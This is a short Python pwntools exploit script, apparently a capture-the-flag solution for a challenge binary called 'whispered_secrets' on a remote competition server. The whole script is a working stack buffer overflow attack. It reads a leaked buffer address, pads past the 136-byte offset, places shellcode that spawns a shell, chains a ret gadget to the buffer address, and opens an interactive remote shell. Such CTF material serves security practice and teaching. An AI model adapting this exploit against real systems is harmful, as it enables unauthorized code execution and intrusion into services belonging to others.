from pwn import *

context.binary=elf=ELF("./whispered_secrets")
p=remote("offsec.m0lecon.it",13528)
#p=process(elf.path)

ret=ROP(elf).find_gadget(['ret'])[0]
p.recvuntil(b"secret: ")
buf_addr=p.recv(14).decode()
buf_addr=int(buf_addr[2:],16)
print(buf_addr)
p.recv()
shellcode=asm(shellcraft.sh())
offset=128+8
payload=flat(
    shellcode,
    b'a'*(offset-len(shellcode)),
    p64(ret),
    p64(buf_addr)
)
p.sendline(payload)
p.recv()
p.interactive()
